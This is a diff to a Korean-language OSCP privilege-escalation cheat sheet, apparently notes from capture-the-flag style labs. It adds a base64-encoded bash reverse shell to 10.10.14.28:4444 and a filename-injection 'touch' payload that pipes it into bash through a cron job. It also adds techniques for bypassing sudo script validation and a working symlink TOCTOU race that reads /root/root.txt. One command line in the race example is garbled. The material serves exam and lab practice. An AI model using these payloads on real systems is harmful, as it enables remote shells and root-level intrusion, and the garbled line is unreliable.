@@ -6,7 +6,7 @@ category: "치트시트"
 section: "OSCP"
 tags: []
 excerpt: "쉘 진입하면 privesc 전에 이 3군데부터 훑는다:"
-readingTime: 17
+readingTime: 20
 ---
 
 ## Looting (쉘 잡으면 크리덴셜 먼저 줍기)
@@ -203,8 +203,8 @@ crontab에서 특정 스크립트가 주기적으로 실행되면서 파일명�
 #base64는 
 touch -- ';echo {BASE64} | base64 -d | bash'
 ~~~
-touch -- ";echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDQ0IDA+JjEK' | base64 -d | bash #"
-
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDQ0IDA+JjEK
+touch -- ';echo {BASE64} | base64 -d | bash ;.png'
 ### 참고
 - [[Networked]]: crontab(*/3) + exec() 파일명 인젝션 → guly
 ---
@@ -428,3 +428,47 @@ cat root.txt
 - [exploit](https://github.com/DylanGrl/nginx_sudo_privesc/blob/main/exploit.sh)
 - [[Broker#Privilege Escalation]]
 ---
+# Sudo 스크립트 검증 로직 우회 
+### 1. 이중 심링크 (readlink 비재귀 우회) 
+- readlink는 1단계만 해석, `realpath/readlink -f`는 재귀적으로 끝까지 해석 - a→b→진짜파일 구조로 grep 필터(1단계 값만 검사)를 통과시킴 
+
+### 2. Unquoted 변수 = 명령어 실행 (Bash 커맨드 인젝션) 대괄호 없이 변수가 실행 위치에 그대로 오면, bash는 그 값을 명령어로 실행함. 
+- `if $VAR; then` — VAR 값이 그대로 실행됨 (예: VAR=bash → 셸 획득) 
+- `while $VAR; do` — 반복 조건으로 VAR 값이 실행됨
+- `eval $VAR` / `eval "$CMD"` — 문자열을 통째로 다시 파싱해서 실행
+- `$($VAR)` / 백틱 `` `$VAR` `` — 서브셸에서 VAR 값을 명령어로 실행 
+- 함수 콜백 패턴: `$HANDLER "$data"` — HANDLER에 임의 값이 오면 그대로 실행됨 
+
+**공통 판별법**: 변수가 대괄호(`[ ]`, `[[ ]]`) 없이 "명령어가 와야 할 자리"(줄 맨 앞, `if`/`while` 뒤, `$()` 안)에 그대로 있는지 확인. + 그 변수를 외부에서 통제 가능한지(env, sudo의 env_keep, 인자 등) 확인.
+
+**참고**
+- [[linkvortex]]
+---
+# 스크립트 시간차를 이용한 경로 하이재킹 / TOCTOU 
+
+- 체크(readlink+grep)와 사용(cat) 사이의 시간차 이용 
+- mv 후 격리 디렉토리에서 이름 덮어쓰기 (LinkVortex 예시) 
+- **범용 개념**: 파일 검증→사용 사이에 상태가 바뀔 수 있는 모든 곳에 적용 가능
+
+ex)스크립트 흐름
+```
+readlink $LINK # ① 체크  
+grep -Eq '(etc|root)' # 필터 통과 여부  
+mv $LINK $QUAR_DIR/ # ② 이동  
+cat QUARDIR/QUAR_DIR/ QUARD​IR/LINK_NAME # ③ 사용
+```
+②와 ③ 사이의 시간차를 노림 — ①체크 시점엔 무해한 파일을 가리키게 해서 필터를 통과시키고, mv 직후·cat 직전에 같은 이름을 진짜 원하는 파일로 덮어치기.
+
+```sh
+# 터미널 A: 격리 디렉토리의 "정확히 같은 파일명"을 무한루프로 계속 갈아치움
+while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done &
+
+# 터미널 B: 무해한 파일(디렉토리 아님, 읽을 수 있는 파일)을 가리키는 심링크로 스크립트 실행
+ln -s /home/bob/.bashrc /home/bob/.cache/toctou.png
+
+CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/.cache/toctou.png
+```
+
+
+**참고**
+- [[linkvortex]]
